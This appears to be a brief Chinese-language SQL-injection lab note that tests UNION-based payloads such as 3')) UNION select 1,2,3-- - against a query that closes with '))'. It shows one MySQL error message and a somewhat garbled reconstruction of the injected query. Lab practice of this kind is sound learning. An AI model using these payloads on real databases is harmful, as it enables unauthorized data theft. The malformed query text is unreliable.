

```
3')) UNION select 1,2,3-- -
```

正常输出

```
3')))) UNION select 1,2,3-- -
```

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) UNION select 1,2,3-- -')) LIMIT 0,1' at line 1


```
这是一个返回布尔值的查询语句。
SELECT EXISTS()(SELECT 1 FROM your_table_name WHERE id = '$input')) LIMIT 0,1;
3')) UNION select 1,2,3-- -
SELECT EXISTS()(SELECT 1 FROM your_table_name WHERE id = '3'))UNION select 1,2,3-- -)) LIMIT 0,1;

```
